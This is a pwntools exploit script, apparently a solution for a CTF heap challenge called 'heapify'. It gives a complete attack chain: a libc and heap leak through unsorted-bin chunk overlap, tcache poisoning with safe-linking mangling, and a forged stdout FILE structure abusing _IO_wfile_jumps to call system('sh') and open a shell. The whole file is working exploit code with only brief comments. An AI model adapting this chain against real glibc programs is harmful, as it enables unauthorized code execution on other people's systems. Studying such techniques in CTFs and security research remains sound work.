#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './heapify.ptched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "60"]
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec heapify
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

IDX = 0
def alloc(size, data):
    global IDX
    if IDX >= 32:
        log.warn("MAXIMUM REACHED")
        return
    
    log.info(f'Alloc [{IDX}]: {hex(size)}')
    io.sendlineafter(b'choice:', b'1')
    io.sendlineafter(b'size:', str(size).encode())
    io.sendlineafter(b'data:', data)
    IDX += 1

def delete(idx):
    log.info(f'Delete [{idx}]')
    io.sendlineafter(b'choice:', b'2')
    io.sendlineafter(b'index:', str(idx).encode())

def view(idx):
    io.sendlineafter(b'choice:', b'3')
    io.sendlineafter(b'index:', str(idx).encode())

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io 
    io = initialize()

    # mandatory, to trigger buffer malloc, such that the subsequent malloc below will be aligned
    alloc(0x10, b'A'*0x10) # 0

    # abusing unsorted bin splitting mechanism to leak libc
    alloc(0x8, b'')   # 1 -> gadget to overwrite the next adjacent chunk size
    alloc(0x200, b'') # 2
    alloc(0x200, b'') # 3
    alloc(0x8, b'')   # 4 -> avoid wilderness consolidation
    delete(1)
    alloc(0x8, p64(0x0)*3 + p64(0x421)) # 5 -> overwrite #2's size, now 2-3 is treated as a single chunk
    delete(2) # puts #2-3 into unsorted bin
    alloc(0x200, b'') # 6 -> splits unsorted bin into 2 chunks of size 0x210 each which corresponds to #2 and #3
                      #      at this point #3 is both at the unsorted bin and chunks[3], because of the splitting
                      #      it also contains the libc address   
    view(3)
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x21ace0
    libc_start_writeable = libc.address + 0x21a000

    alloc(0x200, b'') # 7 -> consume the unsorted bin, also same chunk as #3
    delete(7)
    view(3)
    heap = (u64(io.recvline().strip().ljust(8, b'\x00')) - 1) << 12

    fp = libc.sym["_IO_2_1_stdout_"]

    # tcache poisoning
    alloc(0x10, b'') # 8
    alloc(0x40, b'') # 9
    alloc(0x40, b'') # 10

    delete(10)
    delete(9)
    delete(8)
    alloc(0x10, b'\x00'*0x18 + p64(0x51) + p64(mangle(heap+0x160, fp+1))) # 11, somehow the demangle is broken, so those offset is needed to fulfil malloc alignment

    # copied payload from imaginaryCTF 2024 - onewrite
    # crafting overlapping IO_FILE, wide_data and wide_vtable
    overlap = b'  sh\x00\x00\x00\x00' # [FILE] _flags | [WIDE DATA] read_ptr
    overlap += flat([
        p64(0x0),               # [WIDE DATA] read_end
        p64(0x0),               # [WIDE DATA] read_base
        p64(0x0),               # [WIDE DATA] write_base
        p64(0x0),               # [WIDE DATA] write_ptr
        p64(0x0),               # [WIDE DATA] write_end
        p64(0x0),               # [WIDE DATA] buf_base
        p64(0x0),               # [WIDE DATA] buf_end 
        p64(0x0),               # [WIDE DATA] save_base
        p64(0x0),               # [WIDE DATA] backup_base 
        p64(0x0),               # [WIDE DATA] save_end
    ])
    overlap += b'\x00' * 8       # [WIDE DATA] state
    overlap += b'\x00' * 8       # [WIDE DATA] last_state

    codecvt = b''
    codecvt += p64(libc.sym['system'])     # [FILE] _chain | [WIDE DATA] codecvt | [VTABLE] __doallocate (at function authenticate, skips the puts because we overwrote stdout)
    codecvt += b'\x00' * 0x18                   # padding
    codecvt += p64(fp - 0x10)                   # [FILE] _lock
    codecvt += p64(0x0) * 2                     # padding
    codecvt += p64(fp+0x8)                      # [FILE] _wide_data
    codecvt += b'\x00' * (0x18 + 4 + 20)        # padding
    codecvt += p64(libc.sym['_IO_wfile_jumps']) # [FILE] vtable
    codecvt += b'\x00' * (0x70 - len(codecvt))  # padding
    
    overlap += codecvt
    overlap += p64(0x0)                         # [WIDE DATA] wchar_t shortbuf[1] (alligned to 8 bytes)
    overlap += p64(fp)                          # [WIDE DATA] vtable
    
    alloc(0x40, b'') # 12
    alloc(0x40, overlap) # 13

    log.success('libc base: %#x', libc.address)
    log.success('heap base: %#x', heap)
    log.warning('remaining allocation %d', 32-IDX)
    io.interactive()

if __name__ == '__main__':
    exploit()